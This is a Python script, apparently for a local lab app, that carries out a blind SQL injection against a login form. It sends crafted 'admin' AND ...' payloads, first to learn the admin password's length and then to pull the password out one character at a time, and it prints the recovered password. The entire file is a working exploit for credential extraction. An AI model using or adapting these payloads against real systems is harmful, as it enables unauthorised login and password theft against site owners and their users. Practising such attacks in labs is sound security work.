import requests
import string
from termcolor import colored

url = 'http://127.0.0.1:5000/'
length = 0
correct = string.ascii_letters + string.digits

print("[+] Checking password length ..............")
for i in range (0,100):
    obj = "admin' AND (select '1' from users where user='admin' AND LENGTH(pass)=?)='1' --"
    key = obj.replace("?",str(i))
    logdata = {'user': key,'pass':'a'}
    # print(logdata)
    x = requests.post(url, data = logdata)
    if(x.text == "Logged in successfully"):
        length = i
        print(colored('Length of passowrd of admin user is', 'red'), colored(i, 'green'))
print("_____________________________________________________________________")
print("[+] Exploiting password ..............")

password =""
for i in range(0,length+1):
    obj2 = "admin' AND (SELECT substr(pass,x,1) FROM users WHERE user='admin')='?' --"
    key1 = obj2.replace("x",str(i))
    #print(key1)
    for j in range(0,50):
        key2 = key1.replace("?",correct[j])
        logdata = {'user': key2,'pass':'a'}
        x2 = requests.post(url, data = logdata)
        if(x2.text == "Logged in successfully"):
            password = password + correct[j]
        else:
            j = j+1
print(colored('Password of admin is', 'red'), colored(password, 'green'))